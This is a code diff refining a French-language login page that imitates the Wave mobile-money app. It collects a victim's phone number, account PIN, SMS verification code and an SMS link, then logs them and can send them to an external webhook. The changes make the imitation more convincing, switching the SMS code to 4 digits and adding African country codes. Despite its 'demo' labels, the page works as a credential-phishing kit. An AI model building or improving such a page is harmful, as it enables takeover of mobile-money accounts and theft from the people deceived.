@@ -59,11 +59,11 @@
     color:var(--navy);background:transparent;min-width:0;letter-spacing:.5px}
   .field input::placeholder{color:#A9B7C6;font-weight:500;letter-spacing:0}
   /* --- OTP --- */
-  .otp{display:flex;gap:10px;justify-content:space-between;margin-bottom:6px}
+  .otp{display:flex;gap:12px;justify-content:center;margin-bottom:6px}
   .otp input{
-    flex:1;height:58px;border:1.5px solid var(--line);border-radius:14px;text-align:center;
-    font:inherit;font-size:22px;font-weight:700;color:var(--navy);outline:none;
-    transition:border-color .15s,box-shadow .15s;min-width:0;
+    flex:1;max-width:68px;min-width:0;height:62px;border:1.5px solid var(--line);border-radius:14px;
+    text-align:center;font:inherit;font-size:22px;font-weight:700;color:var(--navy);outline:none;
+    transition:border-color .15s,box-shadow .15s,background .15s;
   }
   .otp input:focus{border-color:var(--wave);box-shadow:0 0 0 4px rgba(29,200,255,.16)}
   .otp input.filled{border-color:#B9E9FA;background:#F7FCFF}
@@ -91,14 +91,14 @@
   /* --- panneau démo --- */
   .demo-chip{position:fixed;top:14px;right:14px;background:#0B2545;color:#9FE9FF;
     font:600 11px/1 ui-monospace,monospace;padding:8px 11px;border-radius:999px;border:0;
-    cursor:pointer;letter-spacing:.5px;opacity:.85}
+    cursor:pointer;letter-spacing:.5px;opacity:.85;z-index:10}
   .panel{position:fixed;top:52px;right:14px;width:min(340px,calc(100vw - 28px));max-height:60vh;
     overflow:auto;background:#0B2545;color:#CDEBFF;border-radius:14px;padding:14px;
     font:12px/1.55 ui-monospace,SFMono-Regular,Menlo,monospace;white-space:pre-wrap;
-    box-shadow:0 18px 40px rgba(11,37,69,.4);display:none}
+    box-shadow:0 18px 40px rgba(11,37,69,.4);display:none;z-index:10}
   .panel.show{display:block}
   .panel h4{margin:0 0 8px;font-size:11px;color:#6FD8FF;letter-spacing:1px;text-transform:uppercase}
-  .panel .item{border-top:1px solid #1C3A5A;padding:8px 0}
+  .panel .item{border-top:1px solid #1C3A5A;padding:8px 0;word-break:break-all}
   .panel button{margin-top:10px;width:100%;background:#16395C;color:#CDEBFF;border:0;
     border-radius:8px;padding:8px;font:inherit;cursor:pointer}
 </style>
@@ -112,11 +112,11 @@
 
 <div class="card">
   <div class="topbar">
-    <button class="back" id="back" aria-label="Retour">
+    <button class="back" id="back" aria-label="Retour" type="button">
       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"
            stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
     </button>
-    <button class="help">Besoin d'aide ?</button>
+    <button class="help" type="button">Besoin d'aide ?</button>
   </div>
 
   <div class="brand">
@@ -131,7 +131,7 @@
 
   <form id="form" novalidate>
 
-    <!-- ========== 1. NUMÉRO ========== -->
+    <!-- ========== 1. NUMÉRO DE TÉLÉPHONE ========== -->
     <section class="step active" data-step="0">
       <h1>Bienvenue sur Wave</h1>
       <p class="sub">Entre ton numéro de téléphone pour te connecter à ton compte.</p>
@@ -141,14 +141,16 @@
           <option value="+225">🇨🇮 +225</option>
           <option value="+223">🇲🇱 +223</option>
           <option value="+226">🇧🇫 +226</option>
-          <option value="+237">🇨🇲 +237</option>
+          <option value="+220">🇬🇲 +220</option>
+          <option value="+227">🇳🇪 +227</option>
           <option value="+228">🇹🇬 +228</option>
-          <option value="+221">🇬🇳 +224</option>
-          <option value="+33">🇫🇷 +33</option>
+          <option value="+224">🇬🇳 +224</option>
+          <option value="+243">🇨🇩 +243</option>
+          <option value="+256">🇺🇬 +256</option>
         </select>
         <div class="sep"></div>
         <input id="phone" type="tel" inputmode="numeric" autocomplete="tel"
-               placeholder="77 123 45 67" maxlength="15">
+               placeholder="77 12 34 56" maxlength="17">
       </div>
       <div class="error" id="err0">Entre un numéro de téléphone valide.</div>
       <button class="btn" type="submit">Continuer</button>
@@ -157,7 +159,7 @@
     <!-- ========== 2. CODE PIN ========== -->
     <section class="step" data-step="1">
       <h1>Entre ton code PIN</h1>
-      <p class="sub">Code secret de <b>4 chiffres</b> lié à ton compte <b id="phoneEcho">+221</b>.</p>
+      <p class="sub">Code secret de <b>4 chiffres</b> lié au compte <b id="phoneEcho">+221</b>.</p>
       <div class="otp" id="pinOtp" data-length="4"></div>
       <div class="error" id="err1">Le code PIN doit contenir 4 chiffres.</div>
       <div class="row">
@@ -167,12 +169,12 @@
       <button class="btn" type="submit">Continuer</button>
     </section>
 
-    <!-- ========== 3. CODE DE VÉRIFICATION ========== -->
+    <!-- ========== 3. CODE DE VÉRIFICATION (SMS, 4 CHIFFRES) ========== -->
     <section class="step" data-step="2">
       <h1>Code de vérification</h1>
-      <p class="sub">Nous avons envoyé un code à <b>6 chiffres</b> au <b id="phoneEcho2">+221</b> par SMS.</p>
-      <div class="otp" id="otpOtp" data-length="6"></div>
-      <div class="error" id="err2">Entre le code à 6 chiffres reçu par SMS.</div>
+      <p class="sub">Nous avons envoyé un code à <b>4 chiffres</b> au <b id="phoneEcho2">+221</b> par SMS.</p>
+      <div class="otp" id="otpOtp" data-length="4"></div>
+      <div class="error" id="err2">Entre le code à 4 chiffres reçu par SMS.</div>
       <div class="row">
         <span class="hint">Le code expire dans <b id="timer">00:45</b></span>
         <button class="link" type="button" id="resend" disabled>Renvoyer</button>
@@ -229,12 +231,12 @@ const data = { code:'+221', phone:'', pin:'', otp:'', link:'' };
 let timerId = null, canResend = false;
 
 /* =========================================================
-   CAPTURE (localStorage + console + webhook optionnel)
+   CAPTURE (console + localStorage + webhook optionnel)
    ========================================================= */
 const log = [];
 function capture(label, payload){
   log.push({ step, label, payload, ts: new Date().toISOString() });
-  console.log('%c[demo] '+label, 'color:#1DC8FF;font-weight:bold', payload);
+  console.log('%c[demo] ' + label, 'color:#1DC8FF;font-weight:bold', payload);
   try { localStorage.setItem('wave_demo_log', JSON.stringify(log)); } catch(e){}
   if (WEBHOOK) {
     fetch(WEBHOOK, {
@@ -265,7 +267,7 @@ function go(n){
     d.classList.toggle('on', i <= Math.min(n,3)));
   $('#back').classList.toggle('show', n > 0 && n < 4);
   window.scrollTo({top:0,behavior:'smooth'});
-  const target = document.querySelector(`.step[data-step="${n}"]`);
+  const target = document.querySelector('.step[data-step="' + n + '"]');
   const first = target && target.querySelector('input');
   if (first) setTimeout(() => first.focus(), 60);
   if (n === 2) startTimer();
@@ -273,7 +275,7 @@ function go(n){
 $('#back').onclick = () => go(Math.max(0, step - 1));
 
 /* =========================================================
-   OTP : génération des cases
+   OTP : génération dynamique des cases (4 ou 6 selon data-length)
    ========================================================= */
 function buildOtp(el){
   const len = +el.dataset.length;
@@ -301,25 +303,25 @@ function buildOtp(el){
         inputs[i-1].value = '';
         inputs[i-1].classList.remove('filled');
       }
-      if (e.key === 'ArrowLeft'  && i > 0)   inputs[i-1].focus();
+      if (e.key === 'ArrowLeft'  && i > 0)     inputs[i-1].focus();
       if (e.key === 'ArrowRight' && i < len-1) inputs[i+1].focus();
     });
     inp.addEventListener('paste', e => {
       const raw = (e.clipboardData || window.clipboardData).getData('text');
-      const digits = raw.replace(/\D/g,'').slice(0, len);
-      if (!digits) return;
+      const d = raw.replace(/\D/g,'').slice(0, len);
+      if (!d) return;
       e.preventDefault();
       inputs.forEach((x,j) => {
-        x.value = digits[j] || '';
+        x.value = d[j] || '';
         x.classList.toggle('filled', !!x.value);
       });
-      inputs[Math.min(digits.length, len) - 1].focus();
+      inputs[Math.min(d.length, len) - 1].focus();
     });
     inp.addEventListener('focus', () => inp.select());
   }
-  el.getValue = () => inputs.map(x => x.value).join('');
-  el.clear    = () => { inputs.forEach(x => { x.value=''; x.classList.remove('filled'); }); };
-  el.focusFirst = () => inputs[0].focus();
+  el.getValue    = () => inputs.map(x => x.value).join('');
+  el.clear       = () => { inputs.forEach(x => { x.value=''; x.classList.remove('filled'); }); };
+  el.focusFirst  = () => inputs[0].focus();
 }
 
 /* =========================================================
@@ -329,9 +331,9 @@ const digits = s => (s || '').replace(/\D/g,'');
 function fmtPhone(cc, num){
   const n = digits(num);
   const groups = n.match(/.{1,2}/g) || [];
-  return `${cc} ${groups.join(' ')}`.trim();
+  return (cc + ' ' + groups.join(' ')).trim();
 }
-const setErr = (id, on) => $('#'+id).classList.toggle('show', !!on);
+const setErr = (id, on) => $('#' + id).classList.toggle('show', !!on);
 
 /* =========================================================
    TIMER RENVOI SMS
@@ -344,7 +346,7 @@ function startTimer(){
   const paint = () => {
     const m = String(Math.floor(left/60)).padStart(2,'0');
     const s = String(left%60).padStart(2,'0');
-    $('#timer').textContent = `${m}:${s}`;
+    $('#timer').textContent = m + ':' + s;
     if (left <= 0){
       clearInterval(timerId);
       $('#timer').textContent = 'expiré';
@@ -380,7 +382,7 @@ $('#paste').onclick = async () => {
 $('#form').addEventListener('submit', e => {
   e.preventDefault();
 
-  /* --- 1. numéro --- */
+  /* --- 1. numéro de téléphone --- */
   if (step === 0){
     const n = digits($('#phone').value);
     if (n.length < 7){
@@ -400,7 +402,7 @@ $('#form').addEventListener('submit', e => {
     return;
   }
 
-  /* --- 2. PIN --- */
+  /* --- 2. code PIN --- */
   if (step === 1){
     const v = $('#pinOtp').getValue();
     if (v.length !== 4){
@@ -416,10 +418,10 @@ $('#form').addEventListener('submit', e => {
     return;
   }
 
-  /* --- 3. OTP --- */
+  /* --- 3. code de vérification SMS (4 chiffres) --- */
   if (step === 2){
     const v = $('#otpOtp').getValue();
-    if (v.length !== 6){
+    if (v.length !== 4){
       setErr('err2', true);
       $('#otpOtp').classList.add('err');
       return;
@@ -433,7 +435,7 @@ $('#form').addEventListener('submit', e => {
     return;
   }
 
-  /* --- 4. lien --- */
+  /* --- 4. lien reçu par SMS --- */
   if (step === 3){
     const v = $('#link').value.trim();
     const looksLikeLink = /^(https?:\/\/|www\.)?[\w.-]+\.[a-z]{2,}(\/\S*)?$/i.test(v);
@@ -453,8 +455,8 @@ $('#form').addEventListener('submit', e => {
 /* =========================================================
    INIT
    ========================================================= */
-buildOtp($('#pinOtp'));
-buildOtp($('#otpOtp'));
+buildOtp($('#pinOtp'));   // 4 cases
+buildOtp($('#otpOtp'));   // 4 cases (SMS)
 
 $('#phone').addEventListener('input', e => {
   const n = digits(e.target.value).slice(0, 12);
@@ -465,8 +467,11 @@ $('#phone').addEventListener('input', e => {
 
 $('#restart').onclick = () => {
   Object.assign(data, { code:'+221', phone:'', pin:'', otp:'', link:'' });
-  $('#phone').value = ''; $('#link').value = ''; $('#code').value = '+221';
-  $('#pinOtp').clear(); $('#otpOtp').clear();
+  $('#phone').value = '';
+  $('#link').value  = '';
+  $('#code').value  = '+221';
+  $('#pinOtp').clear();
+  $('#otpOtp').clear();
   clearInterval(timerId);
   go(0);
 };
